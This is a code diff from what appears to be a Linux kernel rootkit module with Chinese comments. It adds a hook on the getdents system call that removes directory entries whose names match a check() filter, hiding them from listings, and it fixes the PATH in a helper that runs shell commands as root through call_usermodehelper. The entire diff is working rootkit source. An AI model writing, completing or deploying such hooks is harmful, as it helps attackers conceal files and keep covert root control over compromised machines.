@@ -99,7 +99,7 @@ static char *exec_cmd(char *cmd)
     strcpy(tmp, cmd);
     strcat(tmp, output);
     char *cmd_argv[] = {cmd_path, "-c", tmp, NULL};
-    char *cmd_envp[] = {"HOME=/", "PATH=/sbin:/bin:/user/bin", NULL};
+    char *cmd_envp[] = {"HOME=/", "PATH=/sbin:/bin:/usr/bin", NULL};
     result = call_usermodehelper(cmd_path, cmd_argv, cmd_envp, UMH_WAIT_PROC);
     pr_info("[TestKthread]: call_usermodehelper() result is %d\n", result);
     kfree(tmp);
@@ -202,6 +202,59 @@ asmlinkage long hook_getdents64(const struct pt_regs *regs)
         }
         else
             current_dir = (struct linux_dirent64 *)((char *)current_dir + current_dir->d_reclen);
+    }
+
+    error = copy_to_user(dirent, dirent_ker, ret);
+    if (error)
+        goto done;
+done:
+    kfree(dirent_ker);
+    return ret;
+}
+
+//getdents hook函数
+asmlinkage long hook_getdents(const struct pt_regs *regs)
+{
+    long ret;
+    unsigned short len = 0;
+    unsigned short tlen = 0;
+    unsigned int fd;
+    long error;
+    struct linux_dirent __user *dirent;
+    struct linux_dirent *dirent_ker = NULL, *current_dir;
+    unsigned int count;
+
+    // 获取函数参数值
+    fd = regs->di;
+    dirent = regs->si;
+    count = regs->dx;
+    pr_info("getdents not 64 hook success!!");
+
+    // 调用原始函数，截取返回值
+    ret = orig_getdents(regs);
+    dirent_ker = kzalloc(ret, GFP_KERNEL);
+
+    if ((ret < 0) || (dirent_ker == NULL))
+        return ret;
+
+    error = copy_from_user(dirent_ker, dirent, ret);
+    if (error)
+        goto done;
+
+    tlen = ret;
+    current_dir = dirent_ker;
+    // 遍历文件节点列表，找到返回文件名
+    while (tlen > 0)
+    {
+        len = current_dir->d_reclen;
+        tlen = tlen - len;
+        if (check(current_dir->d_name))
+        {
+            ret = ret - len;
+            memmove(current_dir, (char *)current_dir + current_dir->d_reclen, tlen);
+        }
+        else
+            current_dir = (struct linux_dirent *)((char *)current_dir + current_dir->d_reclen);
     }
 
     error = copy_to_user(dirent, dirent_ker, ret);
